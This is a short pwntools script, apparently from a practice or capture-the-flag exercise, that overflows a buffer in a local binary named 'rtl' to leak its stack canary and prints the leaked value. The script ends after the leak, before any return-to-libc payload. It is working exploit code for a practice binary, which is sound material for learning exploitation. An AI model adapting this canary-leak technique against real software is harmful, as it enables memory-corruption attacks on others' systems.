from pwn import *
def slog(name, addr): return success(': '.join([name, hex(addr)]))
p=process("./rtl")


p.recvuntil("Buf: ")
p.send(b"A"*0x39)
p.recvuntil(b"A"*0x39)
canary=u64(b"\x00"+p.recvn(7))
slog('canary', canary)
